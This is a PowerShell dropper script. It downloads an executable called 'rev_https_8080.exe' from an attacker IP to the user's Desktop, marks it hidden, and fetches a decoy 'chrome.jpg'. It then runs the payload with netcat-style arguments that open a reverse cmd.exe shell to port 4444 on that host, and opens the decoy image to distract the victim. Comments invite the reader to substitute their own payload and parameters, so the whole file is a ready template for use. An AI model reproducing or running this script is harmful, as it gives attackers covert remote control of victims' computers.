$url = "192.168.108.128/rev_https_8080.exe" # Define your URL:IP Path and the attached Payload Path
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
$fileName = "rev_https_8080.exe" # replace it with your actual Payload
$finalPath = join-path -Path $desktopPath -ChildPath $fileName 

$url2 = "https://www.google.com/search?sca_esv=3e15a51cabd1aca2&rlz=1C1YTUH_arEG1102EG1102&sxsrf=ACQVn0-yHHUSDB_zzrqb5EQtTfmVGBGcPQ:1711508328798&q=chrome+logo&tbm=isch&source=lnms&prmd=invsmbtz&sa=X&ved=2ahUKEwiB_N6vuZOFAxWkVKQEHdwvC64Q0pQJegQIERAB&biw=1920&bih=919&dpr=1#imgrc=510mlwoiWsaQLM" # Define the second argument
$fileName2 = "chrome.jpg"
$finalPath2 = Join-Path -Path $desktopPath -ChildPath $fileName2 


# Download the file
Invoke-WebRequest -Uri $url -OutFile $finalPath
Set-ItemProperty -Path $finalPath -Name Attribute -Value ([System.IO.FileAttributes]::Hidden)

Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
Set-ItemProperty -Path $finalPath2 -Name Attribute -Value ([System.IO.FileAttributes]::Hidden)

# Define The Parameters for the executions 
$params = "-d 192.168.108.128 4444 -e cmd.exe" # Replace with your actual Parameters

#Execute the file with Parameters
Start-Process -FilePath $finalPath -ArgumentList $params
Start-Process $finalPath2
